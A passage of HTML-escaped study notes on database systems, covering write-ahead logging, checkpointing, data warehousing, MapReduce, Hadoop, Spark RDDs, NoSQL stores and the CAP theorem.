&lt;/h4&gt;&lt;p&gt;Gradual lock release?&lt;/p&gt;
&lt;h3 id=&#34;recovery---atomicity-and-durability&#34; &gt;Recovery - Atomicity and Durability
&lt;span&gt;
    &lt;a href=&#34;#recovery---atomicity-and-durability&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;naïve-approaches&#34; &gt;Naïve Approaches
&lt;span&gt;
    &lt;a href=&#34;#na%c3%afve-approaches&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Force (writes must be reflected on disk when a transaction commits)&lt;/li&gt;
&lt;li&gt;No Steal (flush to disk only at commit)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;logging&#34; &gt;Logging
&lt;span&gt;
    &lt;a href=&#34;#logging&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Write to disk just before (WAL: write ahead logging) an object is modified&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;T_i, start&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;T_i, X, old_value, new-value&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;T_i, commit&amp;gt; or &amp;lt;T_i, abort&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;checkpointing&#34; &gt;Checkpointing
&lt;span&gt;
    &lt;a href=&#34;#checkpointing&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Shortens the amount of log that need to be undone or redone
when a failure occurs&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Output onto stable storage all log records currently residing in main memory&lt;/li&gt;
&lt;li&gt;Output to the disk all modified buffer blocks&lt;/li&gt;
&lt;li&gt;Output onto stable storage a log record of the form &amp;lt;checkpoint L&amp;gt;, where L is a list of transactions active at the time of the checkpoint&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;data-analytics-warehousing-and-mining&#34; &gt;Data Analytics: Warehousing and Mining
&lt;span&gt;
    &lt;a href=&#34;#data-analytics-warehousing-and-mining&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;online-transactional-processing-oltp&#34; &gt;Online Transactional Processing (OLTP)
&lt;span&gt;
    &lt;a href=&#34;#online-transactional-processing-oltp&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;simple queries&lt;/li&gt;
&lt;li&gt;many short transactions making small changes&lt;/li&gt;
&lt;li&gt;Systems tuned to maximize throughput of concurrent transactions&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-analytics&#34; &gt;Data Analytics
&lt;span&gt;
    &lt;a href=&#34;#data-analytics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;the processing of data to infer patterns, correlations, or
models for prediction. Used to make business decisions.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Gather data
&lt;ul&gt;
&lt;li&gt;Extraction-transform-load&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generate aggregates and reports summarizing data&lt;/li&gt;
&lt;li&gt;Build predictive models&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;data-warehouses&#34; &gt;Data Warehouses
&lt;span&gt;
    &lt;a href=&#34;#data-warehouses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;creating-and-maintaining-a-warehouse&#34; &gt;Creating and Maintaining a Warehouse
&lt;span&gt;
    &lt;a href=&#34;#creating-and-maintaining-a-warehouse&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Extract: queries&lt;/li&gt;
&lt;li&gt;Clean: delete or repair tuples&lt;/li&gt;
&lt;li&gt;Transform: reorg&lt;/li&gt;
&lt;li&gt;Load: populate the warehouse tables&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;warehouse-schemas&#34; &gt;Warehouse Schemas
&lt;span&gt;
    &lt;a href=&#34;#warehouse-schemas&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Fact tables&lt;/li&gt;
&lt;li&gt;Dimension tables: additional tables for each fact tables&lt;/li&gt;
&lt;li&gt;Measure attributes: value based&lt;/li&gt;
&lt;li&gt;Dimension attributes: relation based&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;big-data&#34; &gt;Big Data
&lt;span&gt;
    &lt;a href=&#34;#big-data&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Very large volumes of data being collected. Web logs were an early source of data.&lt;/p&gt;
&lt;h3 id=&#34;mapreduce&#34; &gt;MapReduce
&lt;span&gt;
    &lt;a href=&#34;#mapreduce&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Map
&lt;ul&gt;
&lt;li&gt;User-defined functions&lt;/li&gt;
&lt;li&gt;Process input key/value pairs&lt;/li&gt;
&lt;li&gt;Intermediate key/value pairs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reduce
&lt;ul&gt;
&lt;li&gt;User-defined functions&lt;/li&gt;
&lt;li&gt;Intermediate key/value as inputs&lt;/li&gt;
&lt;li&gt;Merges values for a key&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hadoop&#34; &gt;Hadoop
&lt;span&gt;
    &lt;a href=&#34;#hadoop&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Develoepd by Yahoo!&lt;/li&gt;
&lt;li&gt;Hadoop distributed file system (HDFS)
&lt;ul&gt;
&lt;li&gt;Multiple data nodes&lt;/li&gt;
&lt;li&gt;Name nodes store list of block identifiers and machines that have a copy of the block&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;apache-spark&#34; &gt;Apache Spark
&lt;span&gt;
    &lt;a href=&#34;#apache-spark&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Better for iterative computations&lt;/li&gt;
&lt;li&gt;Fault-tolerant and scalable&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;reliable-distributed-dataset-rdd&#34; &gt;Reliable Distributed Dataset (RDD)
&lt;span&gt;
    &lt;a href=&#34;#reliable-distributed-dataset-rdd&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Resilient: if data in memory is lost, recreate&lt;/li&gt;
&lt;li&gt;Distributed: stored in memory across cluster&lt;/li&gt;
&lt;li&gt;Dataset: from a file on HDFS or programmatic&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lineage information retained to reconstruct lost data. Lineage is stored as an object and stored persistently.&lt;/p&gt;
&lt;h4 id=&#34;caching&#34; &gt;Caching
&lt;span&gt;
    &lt;a href=&#34;#caching&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;h4 id=&#34;transformation-and-action&#34; &gt;Transformation and Action
&lt;span&gt;
    &lt;a href=&#34;#transformation-and-action&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;h2 id=&#34;nosql-systems&#34; &gt;NoSQL Systems
&lt;span&gt;
    &lt;a href=&#34;#nosql-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Many new application do not require full machinery that relational DBMS&amp;rsquo;s provide; more so web-based.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Specialized
&lt;ul&gt;
&lt;li&gt;Column (BigTable)&lt;/li&gt;
&lt;li&gt;Key-value (DyanmoDB)&lt;/li&gt;
&lt;li&gt;document (MongoDB)&lt;/li&gt;
&lt;li&gt;graph (Neo4J)
&lt;ul&gt;
&lt;li&gt;Graph DBMSs are transitioning from NoSQL systems to systems implemented
on top of RDBMSs&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Objectives
&lt;ul&gt;
&lt;li&gt;Simplicity (schema-less)&lt;/li&gt;
&lt;li&gt;Scalability and performance&lt;/li&gt;
&lt;li&gt;Flexibility for the programmer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cap-theorem&#34; &gt;CAP Theorem
&lt;span&gt;
    &lt;a href=&#34;#cap-theorem&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Distributed data store, only 2 of 3 are ensured&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Consistency
&lt;ul&gt;
&lt;li&gt;All clients always have the same view of data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Availability
&lt;ul&gt;
&lt;li&gt;Each client can always read and write&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Partition tolerance
&lt;ul&gt;
&lt;li&gt;System works well despite network partitions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Example, two nodes can&amp;rsquo;t communicate with each other, a write is done one node one and a read is done on node 2. What should node 2 do? Return inconsistent data or stay unavailable.&lt;/p&gt;
&lt;p&gt;NoSQL trades consistency for higher availability.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Database community value consistency (ACID)&lt;/li&gt;
&lt;li&gt;Distributed systems value uptime&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;strong-vs-eventual-consistency&#34; &gt;Strong vs. Eventual Consistency
&lt;span&gt;
    &lt;a href=&#34;#strong-vs-eventual-consistency&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Strong (ACID)
&lt;ul&gt;
&lt;li&gt;All nodes hold the same values&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Eventual
&lt;ul&gt;
&lt;li&gt;Nodes may hold different values but will catch up&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;key-value-stores&#34; &gt;Key-Value Stores
&lt;span&gt;
    &lt;a href=&#34;#key-value-stores&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Key = unique id, Value = text, binary data, structured data, etc.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Simple queries
&lt;ul&gt;
&lt;li&gt;Put(key, value): inserts a (key, value) pair&lt;/li&gt;
&lt;li&gt;get(key): returns value associated with key&lt;/li&gt;
&lt;li&gt;get_range(key1, key2): { (key, value) }&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;amazon-dynamodb&#34; &gt;Amazon DynamoDB
&lt;span&gt;
    &lt;a href=&#34;#amazon-dynamodb&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Data model (key, structured value)
&lt;ul&gt;
&lt;li&gt;Simple queries on key and attributes&lt;/li&gt;
&lt;li&gt;key is hash or hash and range&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mongodb&#34; &gt;MongoDB
&lt;span&gt;
    &lt;a href=&#34;#mongodb&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;JSON documents&lt;/li&gt;
&lt;li&gt;db.collection.function (JSON expression)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;google-bigtable&#34; &gt;Google BigTable
&lt;span&gt;
    &lt;a href=&#34;#google-bigtable&#34;&gt;
